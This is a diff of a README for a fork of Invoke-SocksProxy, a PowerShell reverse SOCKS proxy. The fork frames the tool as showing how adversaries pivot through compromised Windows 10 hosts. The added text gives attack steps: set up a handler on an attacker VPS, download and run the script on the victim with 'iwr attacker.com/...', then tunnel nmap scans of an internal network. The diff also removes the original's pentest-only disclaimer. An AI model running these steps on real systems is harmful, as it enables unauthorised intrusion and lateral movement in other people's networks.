@@ -1,62 +1,42 @@
-# Invoke-SocksProxy
-Creates a local or "reverse" Socks proxy using powershell.
+Invoke-SocksProxy is a PowerShell script designed to create reverse proxies. It illustrates one way adversaries use compromised Windows 10 hosts to pivot attacks into local networks.
 
-The local proxy is a simple Socks 4/5 proxy.
+This repository is a fork of [Invoke-SocksProxy](https://github.com/p3nt4/Invoke-SocksProxy), created for [Varonis](https://www.varonis.com/blog/author/tokyoneon/) by [@tokyoneon_](https://twitter.com/tokyoneon_).
 
-The reverse proxy creates a tcp tunnel by initiating outbond SSL connections that can go through the system's proxy. The tunnel can then be used as a socks proxy on the remote host to pivot into the local host's network.
+### Usage
 
-# Examples
+For context and examples with crackmapexec, patator, smbclient, and firefox, review [the official publication](https://www.varonis.com/blog/author/tokyoneon/).
 
-## Local 
-
-Create a Socks 4/5 proxy on port 1080:
+Clone the repository on the attacker's VPS.
 ```
-Import-Module .\Invoke-SocksProxy.psm1
-Invoke-SocksProxy -bindPort 1080
+root@vps > cd /opt; git clone https://github.com/tokyoneon/Invoke-SocksProxy
 ```
 
-Increase the maximum number of threads from 200 to 400
+Start the reverse proxy handler.
 ```
-Import-Module .\Invoke-SocksProxy.psm1
-Invoke-SocksProxy -threads 400
-```
-## Reverse
-
-Create a "reverse" Socks 4/5 proxy on port 1080 of a remote host:
-```
-# On the remote host: 
-# Generate a private key and self signed cert
-openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout private.key -out cert.pem
-
-# Get the certificate fingerprint to verify it:
-openssl x509 -in cert.pem -noout -sha1 -fingerprint | cut -d "=" -f 2 | tr -d ":"
-
-# Start the handler
-python ReverseSocksProxyHandler.py 443 1080 ./cert.pem ./private.key
-
-# On the local host:
-Import-Module .\Invoke-SocksProxy.psm1
-Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 
-
-# Go through the system proxy:
-Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 -useSystemProxy
-
-# Validate certificate
-Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 -certFingerprint '93061FDB30D69A435ACF96430744C5CC5473D44E'
-
-# Give up after a number of failed connections to the handler:
-Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 -maxRetries 10
-
+root@vps > cd /opt/Invoke-SocksProxy; ./ReverseSocksProxyHandler.py
 ```
 
-Credit for the System Proxy trick: https://github.com/Arno0x/PowerShellScripts/blob/master/proxyTunnel.ps1
+![](images/01.png)
 
+Change the [hardcoded VPS address in the PS1](https://github.com/tokyoneon/Invoke-SocksProxy/blob/master/Invoke-SocksProxy.ps1#L1) and host it on an HTTP server. Download it on the compromised Windows 10 workstation and execute.
+```
+Ps > cd $env:TEMP
+Ps > iwr attacker.com/Invoke-SocksProxy.ps1 -outfile isp.ps1
+Ps > .\isp.ps1
+```
 
-# Limitations
-- This is only a subset of the Socks 4 and 5 protocols: It does not support authentication, It does not support UDP or bind requests.
-- When the Socks Proxy runs out of available threads, new connections cannot be established until a thread is freed.
-- New features will be implemented in the future. PR are welcome.
+![](images/02.png)
 
-# Disclaimer
-This project is intended for security researchers and penetration testers and should only be used with the approval of system owners.
+Configure proxychains to use the VPS address.
+```
+sudo apt-get install -y proxychains4 && sudo nano /etc/proxychains4.conf
+```
 
+![](images/03.png)
+
+Proxy Nmap scans with proxychains.
+```
+proxychains nmap -sT -Pn -n -p445,139,88,80 172.16.0.4,115
+```
+
+![](images/04.png)
